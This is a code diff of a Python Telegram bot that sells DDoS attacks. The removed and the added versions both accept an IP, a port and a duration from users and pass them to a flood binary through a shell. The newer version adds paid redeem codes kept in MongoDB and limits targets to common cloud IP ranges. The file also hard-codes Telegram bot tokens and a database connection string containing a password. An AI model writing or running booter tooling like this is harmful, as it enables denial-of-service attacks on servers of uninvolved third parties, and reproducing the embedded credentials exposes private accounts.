@@ -1,228 +1,302 @@
-#!/usr/bin/python3
-import telebot
-import datetime
-import time
-import subprocess
-import threading
 
-from keep_alive import keep_alive
-keep_alive()
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7929824597:AAGbA3_hcvHPGPH7oA2N4jK431pzD_NUO0s')
+import asyncio
+import random
+import string
+import logging
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
+from pymongo import MongoClient
+from datetime import datetime, timedelta, timezone
 
-# Admin user IDs
-admin_id = ["7700702349"]
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# Group and channel details
-GROUP_ID = "-1002439481052"
-CHANNEL_USERNAME = "@NUCLEARXCRACKS"
+MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
+client = MongoClient(MONGO_URI)
+db = client['TEST']
+users_collection = db['VAMPIREXCHEATS']
+redeem_codes_collection = db['redeem_codes0']
 
-# Default cooldown and attack limits
-COOLDOWN_TIME = 200  # Cooldown in seconds
-ATTACK_LIMIT = 10  # Max attacks per day
+TELEGRAM_BOT_TOKEN = '7704003705:AAFDWwSEkaOKSy0UNs1jr-tFsC5KQx-2Kv0'
+ADMIN_USER_ID = 529691217  
 
-# Files to store user data
-USER_FILE = "users.txt"
+cooldown_dict = {}
+user_attack_history = {}
+valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
 
-# Dictionary to store user states
-user_data = {}
-global_last_attack_time = None  # Global cooldown tracker
+async def help_command(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        help_text = (
+            "*Here are the commands you can use:* \n\n"
+            "*⚡ /start* - Start interacting with the bot.\n"
+            "*⚡ /attack* - Trigger an attack operation.\n"
+            "*⚡ /redeem* - Redeem a code.\n"
+            "*⚡ /get_id* - Get Your Id?.\n"
+        )
+    else:
+        help_text = (
+            "*☄️ Available Commands for Admins:*\n\n"
+            "*⚡ /start* - Start the bot.\n"
+            "*⚡ /attack* - Start the attack.\n"
+            "*⚡ /get_id* - Get user id.\n"
+            "*⚡ /remove [user_id]* - Remove a user.\n"
+            "*⚡ /users* - List all allowed users.\n"
+            "*⚡ /gen* - Generate a redeem code.\n"
+            "*⚡ /redeem* - Redeem a code.\n"
+        )
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
+    
+async def start(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id  
+    user_name = update.effective_user.first_name  
+    if not await is_user_allowed(user_id):
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot! /get_id*", parse_mode='Markdown')
+        return
+    message = (
+       "*🚀ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ıllıllı ƔαɱקIııƦǝ ɱσ∂ χ DɗoS̴ S̴ǝƦƔǝƦ ıllıllı 🚀*\n\n"
+        "*💀Use /attack <ip> <port> <duration>*\n"
+        "*💀ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @DEMON_ROCKY 🚀*" 
+    )
+    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
-# Function to load user data from the file
-def load_users():
+async def remove_user(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
+        return
+    if len(context.args) != 1:
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
+        return
+    target_user_id = int(context.args[0])
+    users_collection.delete_one({"user_id": target_user_id})
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')
+
+async def is_user_allowed(user_id):
+    user = users_collection.find_one({"user_id": user_id})
+    if user:
+        expiry_date = user['expiry_date']
+        if expiry_date:
+            if expiry_date.tzinfo is None:
+                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
+            if expiry_date > datetime.now(timezone.utc):
+                return True
+    return False
+
+async def attack(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    if not await is_user_allowed(user_id):
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        return
+    args = context.args
+    if len(args) != 3:
+        await context.bot.send_message(chat_id=chat_id, text="*🚀 Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        return
+    ip, port, duration = args
+    if not ip.startswith(valid_ip_prefixes):
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
+        return
+    cooldown_period = 60
+    current_time = datetime.now()
+    if user_id in cooldown_dict:
+        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
+        if time_diff < cooldown_period:
+            remaining_time = cooldown_period - int(time_diff)
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"*⏳ Wait for Attack finish {remaining_time}*",
+                parse_mode='Markdown'
+            )
+            return
+    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
+        return
+    cooldown_dict[user_id] = current_time
+    if user_id not in user_attack_history:
+        user_attack_history[user_id] = set()
+    user_attack_history[user_id].add((ip, port))
+    await context.bot.send_message(
+    chat_id=chat_id,
+    text=(
+        f"*💀 ⚠️𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉𝙄𝙏𝙄𝘼𝙏𝙀𝘿!❗ 💀*\n"
+        f"💢 *ꜱɪɢᴍᴀ ꜱᴛʀɪᴋᴇ ɪɴ ᴇꜰᴇᴇᴄᴛ!* 💢\n\n"
+        f"*🎯 ᴛᴀʀɢᴇᴛ ꜱᴇᴛ: {ip}:{port}*\n"
+        f"*⏳ᴅᴜʀᴀᴛɪᴏɴ ʟᴏᴄᴋᴇᴅ: {duration} seconds*\n"
+        f"*🔥ᴜɴʟᴇᴀꜱʜɪɴɢ ꜰᴏʀᴄᴇ. ɴᴏ ᴛᴜʀɴɪɴɢ ʙᴀᴄᴋ. Powered by @vampirexcheats💥*"
+    ), parse_mode='Markdown')
+
+    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+
+async def VAMPIREXCHEATS(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id 
+    message = f"YOUR USER ID: `{user_id}`" 
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
+
+async def run_attack(chat_id, ip, port, duration, context):
     try:
-        with open(USER_FILE, "r") as file:
-            for line in file:
-                user_id, attacks, last_reset = line.strip().split(',')
-                user_data[user_id] = {
-                    'attacks': int(attacks),
-                    'last_reset': datetime.datetime.fromisoformat(last_reset),
-                    'last_attack': None
-                }
-    except FileNotFoundError:
-        pass
-
-# Function to save user data to the file
-def save_users():
-    with open(USER_FILE, "w") as file:
-        for user_id, data in user_data.items():
-            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")
-
-# Middleware to ensure users are joined to the channel
-def is_user_in_channel(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
-        return False
-
-# Command to handle attacks
-@bot.message_handler(commands=['attack1'])
-def handle_attack(message):
-    global global_last_attack_time
-    user_id = str(message.from_user.id)
-
-    # Ensure user is in the group
-    if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "This bot can only be used in the specified group. Join - https://t.me/NUCLEARCRACKS")
-        return
-
-    # Ensure user is a member of the channel
-    if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
-        return
-
-    # Check global cooldown
-    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
-        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
-        bot.reply_to(message, f"An attack is already in progress. Please wait {remaining_time} seconds.")
-        return
-
-    # Initialize user data if not present
-    if user_id not in user_data:
-        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}
-
-    user = user_data[user_id]
-
-    # Check user's daily attack limit
-    if user['attacks'] >= ATTACK_LIMIT:
-        bot.reply_to(message, f"You have reached your daily attack limit of {ATTACK_LIMIT}. Try again tomorrow.")
-        return
-
-    # Parse command arguments
-    command = message.text.split()
-    if len(command) != 4:
-        bot.reply_to(message, "Usage: /attack1 <IP> <PORT> <TIME>")
-        return
-
-    target, port, time_duration = command[1], command[2], command[3]
-
-    try:
-        port = int(port)
-        time_duration = int(time_duration)
-    except ValueError:
-        bot.reply_to(message, "Error: PORT and TIME must be integers.")
-        return
-
-    if time_duration > 180:
-        bot.reply_to(message, "Error: Attack duration cannot exceed 180 seconds.")
-        return
-
-    # Execute the attack via the binary
-    full_command = f"./raja {target} {port} {time_duration} 800"
-    try:
-        bot.reply_to(message, f"Attack started on Target: {target}, Port: {port}, Time: {time_duration} seconds.\n"
-                              f"Remaining attacks for you: {ATTACK_LIMIT - user['attacks'] - 1}")
-        subprocess.run(full_command, shell=True)
-        bot.reply_to(message, f"Attack completed on Target: {target}, Port: {port}, Time: {time_duration} seconds.")
+        process = await asyncio.create_subprocess_shell(
+            f"./VAMPIRE {ip} {port} {duration} 1024 400 ",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
     except Exception as e:
-        bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
+        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+    finally:
+        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
+
+async def generate_redeem_code(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="*❌ You are not authorized to generate redeem codes!*", 
+            parse_mode='Markdown'
+        )
         return
-
-    # Update user data and global cooldown
-    user['attacks'] += 1
-    user['last_attack'] = datetime.datetime.now()
-    global_last_attack_time = datetime.datetime.now()
-    save_users()
-
-# Command to check global cooldown
-@bot.message_handler(commands=['check_cooldown'])
-def check_cooldown(message):
-    if global_last_attack_time and (datetime.datetime.now() - global_last_attack_time).seconds < COOLDOWN_TIME:
-        remaining_time = COOLDOWN_TIME - (datetime.datetime.now() - global_last_attack_time).seconds
-        bot.reply_to(message, f"Global cooldown: {remaining_time} seconds remaining.")
+    if len(context.args) < 1:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
+            parse_mode='Markdown'
+        )
+        return
+    max_uses = 1
+    custom_code = None
+    time_input = context.args[0]
+    if time_input[-1].lower() in ['d', 'm']:
+        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
     else:
-        bot.reply_to(message, "No global cooldown. You can initiate an attack.")
-
-# Command to check remaining attacks for a user
-@bot.message_handler(commands=['check_remaining_attack'])
-def check_remaining_attack(message):
-    user_id = str(message.from_user.id)
-    if user_id not in user_data:
-        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
-    else:
-        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
-        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")
-
-# Admin commands
-@bot.message_handler(commands=['reset'])
-def reset_user(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
+        custom_code = time_input
+        time_input = context.args[1] if len(context.args) > 1 else None
+        redeem_code = custom_code
+    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id, 
+            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
+            parse_mode='Markdown'
+        )
         return
+    if time_input[-1].lower() == 'd':  
+        time_value = int(time_input[:-1])
+        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
+        expiry_label = f"{time_value} day"
+    elif time_input[-1].lower() == 'm':  
+        time_value = int(time_input[:-1])
+        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
+        expiry_label = f"{time_value} minute"
+    if len(context.args) > (2 if custom_code else 1):
+        try:
+            max_uses = int(context.args[2] if custom_code else context.args[1])
+        except ValueError:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id, 
+                text="*⚠️ Please provide a valid number for max uses.*", 
+                parse_mode='Markdown'
+            )
+            return
+    redeem_codes_collection.insert_one({
+        "code": redeem_code,
+        "expiry_date": expiry_date,
+        "used_by": [], 
+        "max_uses": max_uses,
+        "redeem_count": 0
+    })
+    message = (
+        f"✅ Redeem code generated: `{redeem_code}`\n"
+        f"Expires in {expiry_label}\n"
+        f"Max uses: {max_uses}"
+    )
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id, 
+        text=message, 
+        parse_mode='Markdown'
+    )
 
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /reset <user_id>")
+async def redeem_code(update: Update, context: CallbackContext):
+    chat_id = update.effective_chat.id
+    user_id = update.effective_user.id
+    if len(context.args) != 1:
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
         return
-
-    user_id = command[1]
-    if user_id in user_data:
-        user_data[user_id]['attacks'] = 0
-        save_users()
-        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
-    else:
-        bot.reply_to(message, f"No data found for user {user_id}.")
-
-@bot.message_handler(commands=['setcooldown'])
-def set_cooldown(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
+    code = context.args[0]
+    redeem_entry = redeem_codes_collection.find_one({"code": code})
+    if not redeem_entry:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
         return
-
-    command = message.text.split()
-    if len(command) != 2:
-        bot.reply_to(message, "Usage: /setcooldown <seconds>")
+    expiry_date = redeem_entry['expiry_date']
+    if expiry_date.tzinfo is None:
+        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
+    if expiry_date <= datetime.now(timezone.utc):
+        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
         return
-
-    global COOLDOWN_TIME
-    try:
-        COOLDOWN_TIME = int(command[1])
-        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
-    except ValueError:
-        bot.reply_to(message, "Please provide a valid number of seconds.")
-
-@bot.message_handler(commands=['viewusers'])
-def view_users(message):
-    if str(message.from_user.id) not in admin_id:
-        bot.reply_to(message, "Only admins can use this command.")
+    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
         return
+    if user_id in redeem_entry['used_by']:
+        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
+        return
+    users_collection.update_one(
+        {"user_id": user_id},
+        {"$set": {"expiry_date": expiry_date}},
+        upsert=True
+    )
+    redeem_codes_collection.update_one(
+        {"code": code},
+        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
+    )
+    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')
 
-    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
-                           for user_id, data in user_data.items()])
-    bot.reply_to(message, f"User Summary:\n\n{user_list}")
+async def list_users(update, context):
+    current_time = datetime.now(timezone.utc)
+    users = users_collection.find()    
+    user_list_message = "👥 User List:\n" 
+    for user in users:
+        user_id = user['user_id']
+        expiry_date = user['expiry_date']
+        if expiry_date.tzinfo is None:
+            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
+        time_remaining = expiry_date - current_time
+        if time_remaining.days < 0:
+            remaining_days = -0
+            remaining_hours = 0
+            remaining_minutes = 0
+            expired = True  
+        else:
+            remaining_days = time_remaining.days
+            remaining_hours = time_remaining.seconds // 3600
+            remaining_minutes = (time_remaining.seconds // 60) % 60
+            expired = False      
+        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
+        if expired:
+            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
+        else:
+            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
+    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')
 
+def main():
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("remove", remove_user))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("gen", generate_redeem_code))
+    application.add_handler(CommandHandler("redeem", redeem_code))
+    application.add_handler(CommandHandler("get_id", VAMPIREXCHEATS))
+    application.add_handler(CommandHandler("users", list_users))
+    application.add_handler(CommandHandler("help", help_command))
+    
+    application.run_polling()
+    logger.info("Bot is running.")
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, Feel Free to Explore.\nThe World's Best Ddos Bot\nTo Use This Bot Join https://t.me/NUCLEARCRACKS"
-    bot.reply_to(message, response)
-
-# Function to reset daily limits automatically
-def auto_reset():
-    while True:
-        now = datetime.datetime.now()
-        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
-        time.sleep(seconds_until_midnight)
-        for user_id in user_data:
-            user_data[user_id]['attacks'] = 0
-            user_data[user_id]['last_reset'] = datetime.datetime.now()
-        save_users()
-
-# Start auto-reset in a separate thread
-reset_thread = threading.Thread(target=auto_reset, daemon=True)
-reset_thread.start()
-
-# Load user data on startup
-load_users()
-
-
-#bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-        # Add a small delay to avoid rapid looping in case of persistent errors
-        time.sleep(15)
+if __name__ == '__main__':
+    main()
+            
